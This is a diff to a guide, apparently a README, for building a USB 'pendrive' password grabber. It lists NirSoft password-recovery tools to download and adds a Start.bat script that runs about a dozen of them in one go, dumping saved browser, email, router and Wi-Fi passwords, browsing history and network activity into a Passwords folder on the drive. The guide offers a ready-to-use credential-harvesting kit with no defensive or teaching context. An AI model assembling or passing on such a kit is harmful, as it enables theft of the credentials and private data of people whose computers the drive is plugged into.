@@ -28,8 +28,29 @@ Then download:
       https://www.nirsoft.net/utils/web_browser_downloads_view.html
       https://www.nirsoft.net/utils/process_tcp_summary.html
       https://www.nirsoft.net/utils/router_password_recovery.html
-      https://www.nirsoft.net/internet_explorer_password.html
     
-Your pendrive will look like this:
+Your pendrive will look like this after downloading all the above files:
 
 https://i.imgur.com/sbzTDM1.png
+
+
+
+Finally, Create a folder named  Passwords
+
+then create a file named  Start.bat 
+
+Open Start.bat with notepad
+
+Finally paste the code below:
+      start BrowserDownloadsView.exe /stext Passwords\BrowserDownloads.txt
+      start BrowsingHistoryView.exe /stext Passwords\BrowsingHistory.txt
+      start ChromePass.exe /stext Passwords\ChromePass.txt
+      start iepv.exe /stext Passwords\iepv.txt
+      start mailpv.exe /stext Passwords\mailpv.txt
+      start mspass.exe /stext Passwords\mspass.txt
+      start PasswordFox.exe /stext Passwords\PasswordFox.txt
+      start ProcessTCPSummary.exe /stext Passwords\ProcessTCPSummary.txt
+      start PstPassword.exe /stext Passwords\PstPassword.txt
+      start RouterPassView.exe /stext Passwords\RouterPassView.txt
+      start WebBrowserPassView.exe /stext Passwords\WebBrowserPass.txt
+      start WifiHistoryView.exe /stext Passwords\WifiHistoryView.txt
